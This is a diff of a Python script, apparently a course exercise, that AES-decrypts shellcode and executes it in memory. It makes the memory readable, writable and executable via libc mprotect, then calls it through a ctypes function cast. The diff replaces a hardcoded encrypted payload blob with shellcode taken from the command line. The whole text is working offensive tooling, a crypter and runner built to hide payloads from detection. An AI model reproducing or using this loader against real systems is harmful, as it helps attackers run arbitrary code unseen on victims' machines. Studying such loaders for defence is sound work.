@@ -11,18 +11,20 @@
 
 # Imports
 
-import Crypto
+from Crypto.Cipher import AES
 import sys
-#import argparse
+import argparse
 import os
 import hashlib
-import ctypes
+from ctypes import *
+
 
 #---------------------------------------
 #
 # Define our Encryption Functions
 #
 #--------------------------------------
+
 
 def aesDecrypter(key, IV, shellcode, salt):
   hashedKey = hashlib.sha256(key + salt).digest()
@@ -38,13 +40,18 @@ def aesDecrypter(key, IV, shellcode, salt):
 def main():
   # Setup the argument parser
 
+  parser = argparse.ArgumentParser()
+  parser.add_argument("-s", "--shellcode", help="Shellcode to encrypt", dest='shellcode', required=True)
+  parser.add_argument('-k', '--key', help='AES key to use for encryption', dest='key', required=True)
+  options = parser.parse_args()
+
 
   # Prepare some objects
-  encryptedPayload = "a53c9b1f161a190e121895a41cc11f2f8e5dd83bb77eab0f6eedb5bbe19330d63056c95af97fd2642c7ff24af281a61108c46def782cd3c46ce0a0bd74468c51cf4aa1327b5704854d5cc409b8a4cd5a8a4e2c7069f5ec2080b2403e1ea994bf5c4db342987ee217a4292ed4a0b5a5517f6344063ac3d51f32a1c78618bd346b8c7f70ff1dced246ecffb9f9ecdc9acb4e9dccfbe87bade5c7c9fa95499b387d"
-  IV = encryptedPayload.decode('hex')[:16]
-  salt = encryptedPayload.decode('hex')[16:32]
+  encryptedPayload = (options.shellcode).replace("\\x", "").decode('hex')
+  IV = encryptedPayload[:16]
+  salt = encryptedPayload[16:32]
   key = 'slae32'
-  shellcode = encryptedPayload.decode('hex')[32::]
+  shellcode = encryptedPayload[32::]
 
   decrypted = aesDecrypter(key, IV, shellcode, salt)
 
@@ -56,8 +63,10 @@ def main():
   libC = CDLL('libc.so.6')
 
   #print decrypted
-  code = c_char_p(decrypted)
-  sizeOfDecryptedShellcode = len(decrypted)
+  shellcode = str(decrypted)
+  shellcode = shellcode.replace('\\x', '').decode('hex')
+  code = c_char_p(shellcode)
+  sizeOfDecryptedShellcode = len(shellcode)
 
   # now we need to setup our void *valloc(size_t size) and get our pointer to allocated memory
 
@@ -73,12 +82,13 @@ def main():
   # R, WR, X = 0x7
 
   protectMemory = libC.mprotect(memAddrPointer, sizeOfDecryptedShellcode, 7)
-
+#  print protectMemory
 
   # now we set up a quick execution for our shellcode using cast ctypes.cast = cast(obj, typ)
   # we'll have to call ctypes.CFUNCTYPE to identify memAddrPointer as void * (c_void_p) type
 
   run = cast(memAddrPointer, CFUNCTYPE(c_void_p))
+#  print run
   run()
 
 
